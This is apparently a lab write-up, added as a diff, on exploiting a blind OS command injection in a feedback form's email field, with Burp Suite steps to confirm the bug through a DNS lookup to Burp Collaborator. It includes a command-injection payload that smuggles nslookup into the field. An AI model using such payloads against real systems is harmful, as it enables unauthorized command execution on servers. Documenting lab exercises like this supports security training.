@@ -1,0 +1,42 @@
+Description:
+The application contains a blind OS command injection vulnerability in the feedback function.
+The command is executed asynchronously and has no visible effect on the response.
+However, it is possible to trigger out-of-band (OOB) interactions with an external service.
+
+Objective:
+-Trigger a DNS request to Burp Collaborator
+-Confirm command execution
+
+Tools Used:
+-Burp Suite (Proxy, Collaborator)
+
+Exploitation Steps
+1️-Intercept Request
+-Go to the Feedback form
+-Submit any data
+-Intercept the request using Burp Suite
+
+2️-Identify Vulnerable Parameter
+-Locate parameter:
+email
+
+3️-Inject Payload
+-Modify the parameter:
+email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+
+4️-Insert Collaborator Payload
+-Right-click → Insert Collaborator Payload
+-Replace BURP-COLLABORATOR-SUBDOMAIN with generated domain
+
+5️-Send Request
+-Forward the request
+
+6️-Check for Interaction
+-Go to Burp Collaborator tab
+-Click Poll now
+
+You may need to wait a few seconds (asynchronous execution)
+
+Result:
+-Received DNS interaction from target server
+-Successfully confirmed blind command execution
